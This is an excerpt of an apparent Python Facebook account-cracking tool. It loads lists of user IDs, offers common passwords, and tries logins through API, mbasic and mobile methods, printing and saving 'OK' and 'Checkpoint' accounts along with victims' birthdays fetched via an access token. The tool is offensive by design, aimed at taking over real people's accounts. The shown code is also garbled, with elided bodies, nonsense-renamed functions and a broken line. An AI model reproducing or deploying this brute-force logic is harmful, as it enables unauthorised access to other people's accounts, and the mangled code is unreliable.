...
def hasil(ok,cp):
	...
	if len(ok) != 0 or len(cp) != 0:
	 ...
	 SHAHZAD _PANWAR('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
		...
		#SHAHZAD_PANWAR('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
...
class __crack__:
	...
	def plerr(self):
		...
		try:
			...
			self.id = SHAHZAD(self.apk).read().splitlines()

			SHAHZAD_PANWAR(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
			...
			SHAHZAD_PANWAR('\nEnter Password 786786or 11223344For OLd Idz ')

			while True:

				pwek = input('\nEnter Password : ')

				#SHAHZAD_PANWAR('Sandi > %s'%(pwek))
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							SHAHZAD_PANWAR('[•] Result CP saved to CP.txt')
					...
					SHAHZAD_PANWAR('02.) Metode mbasic ')

					SHAHZAD_PANWAR('03.) Metode Mobile ')
			...
			SHAHZAD_PANWAR(' [1] AKING Method 1 ')

			SHAHZAD_PANWAR(' [2] AKING Method 2  [ Pro ]')

			SHAHZAD_PANWAR(' [3] AKING Method 3   ')
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				...
				ua_xiaomi = SHAHZAD('agent.txt', 'r').read()
			...
			if "access_token" in p:
				...
				SHAHZAD_PANWAR('\r\033[1;92m[Successful-SHAHZAD] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					SHAHZAD_PANWAR('\r\033[1;91m[Checkpoint-SHAHZAD] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
				...
				SHAHZAD_PANWAR('\r\033[1;91m[Checkpoint-SHAHZAD] %s | %s%s      '%(user,pw,tahun(user)))
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write('\r\033[1;97m [SHAHZAD] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				SHAHZAD_PANWAR('\r\033[1;32m[Successful-SHAHZAD] %s | %s      ' % (user,pw))
				...
				try:
					...
					token = SHAHZAD('token.txt').read()

					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']

					month, day, year = cp_ttl.split('/')

					month = bulan_ttl[month]. SHAHZAD_PANWAR('\r\033[1;91m[Checkpoint-SHAHZAD] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
				...
				SHAHZAD('\r\033[1;91m[Checkpoint-SHAHZAD] %s | %s%s      ' % (user,pw,tahun(user)))
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
			 ...
			 SHAHZAD_PANWAR('\r\033[1;92m[Successful-SHAHZAD] %s | %s      '%(user,pw))
				...
				try:
					...
					cp_ttl = Prof_Shahzad('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']

					month, day, year = cp_ttl.split('/')

					month = bulan_ttl[month]

					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-SHAHZAD] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
...
banner="""\033[1;37m
 ...
 [*]=============================================
    ...
    Author   : SHAHZAD PANWAR

    Facebook : https://facebook.com/Shahzad.Panwar
